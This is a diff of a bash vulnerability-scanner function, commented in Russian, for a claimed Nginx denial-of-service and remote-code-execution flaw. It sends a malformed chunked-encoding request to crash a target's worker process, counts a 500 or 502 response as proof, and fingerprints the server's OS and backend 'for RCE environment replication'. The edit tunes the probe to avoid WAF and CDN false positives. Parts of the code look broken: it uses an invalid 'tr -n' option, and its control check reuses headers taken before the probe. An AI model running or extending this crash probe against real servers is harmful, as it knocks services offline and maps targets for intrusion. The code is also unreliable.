@@ -932,18 +932,28 @@ check_ENV_EXPOSED() {
 
 #############################################################################
 # 32. NGINX DoS/RCE (CVE-2026-42945)
-# Active-only heuristic probe. Triggers worker crash via malformed chunked 
-# encoding. Extracts target metadata for RCE environment replication.
+# FIX: Strict pre-flight check to ensure the target is actually Nginx 
+# before sending anomalous packets to avoid WAF/CDN false positives.
 #############################################################################
 check_NGINX_CVE_2026_42945() {
     local url=$1 domain=$2
     _tz_reset_hit
-    
-    # Берем базовый URL без параметров
     local base_url="${url%%\?*}"
 
-    # АКТИВНЫЙ ВЕКТОР (Heuristic Crash Probe)
-    # Отправляем искаженный заголовок. Если Nginx уязвим, процесс-воркер упадет.
+    # =========================================================================
+    # ШАГ 1: СТРОГИЙ ФИЛЬТР (Отсекаем всё, кроме Nginx)
+    # =========================================================================
+    local pre_headers
+    pre_headers=$(curl -s -k -I --max-time 5 "$base_url")
+    
+    # Если в заголовках нет слова Nginx — сразу выходим!
+    if ! echo "$pre_headers" | grep -qiE '^Server:[[:space:]]*nginx'; then
+        return 0 
+    fi
+
+    # =========================================================================
+    # ШАГ 2: АКТИВНЫЙ ВЕКТОР (Эвристика)
+    # =========================================================================
     local probe_status
     probe_status=$(curl -s -k -o /dev/null -w "%{http_code}" \
         -H "Connection: Keep-Alive" \
@@ -952,29 +962,22 @@ check_NGINX_CVE_2026_42945() {
         --max-time 5 \
         "$base_url")
 
-    # Если мы получили ошибку бэкенда (502, 500) или разрыв соединения (000)
-    if [ "$probe_status" = "502" ] || [ "$probe_status" = "500" ] || [ "$probe_status" = "000" ]; then
+    # Проверяем только 500/502 (падение воркера). 000 (разрыв) убираем, так как это реакция WAF
+    if [ "$probe_status" = "502" ] || [ "$probe_status" = "500" ]; then
         
-        # КОНТРОЛЬНЫЙ ЗАПРОС (Проверка доступности)
-        local headers
-        headers=$(curl -s -k -I --max-time 5 "$base_url")
         local control_status
-        control_status=$(echo "$headers" | head -n 1 | awk '{print $2}')
+        control_status=$(echo "$pre_headers" | head -n 1 | awk '{print $2}')
         
-        # Если без пейлоада сервер отдает 200/301/400/403, значит упал именно один воркер!
-        if [[ "$control_status" =~ ^[234] ]]; then
-            
-            # СБОР МЕТАДАННЫХ (Target Fingerprinting)
+        if [[ "$control_status" =~ ^[23] ]]; then
             local srv_header os_info backend_info
-            
-            srv_header=$(echo "$headers" | grep -iE '^Server:' | tr -d '\r\n')
+            srv_header=$(echo "$pre_headers" | grep -iE '^Server:' | tr -d '\r\n')
             os_info=$(echo "$srv_header" | grep -oE '\([^)]+\)')
             [ -z "$os_info" ] && os_info="(OS Hidden)"
             
-            backend_info=$(echo "$headers" | grep -iE '^(X-Powered-By|Via|X-Backend):' | tr -n '\r\n' ' | ' | sed 's/ | $//')
+            backend_info=$(echo "$pre_headers" | grep -iE '^(X-Powered-By|Via|X-Backend):' | tr -n '\r\n' ' | ' | sed 's/ | $//')
             [ -z "$backend_info" ] && backend_info="Backend Hidden"
 
-            TZ_HIT_POC="$base_url  [Payload: Transfer-Encoding anomaly]"
+            TZ_HIT_POC="$base_url"
             TZ_HIT_PROOF="CVE-2026-42945 Verified (Crash $probe_status). Lab Target: [${srv_header}] ${os_info} | Env: [${backend_info}]"
             return 1
         fi
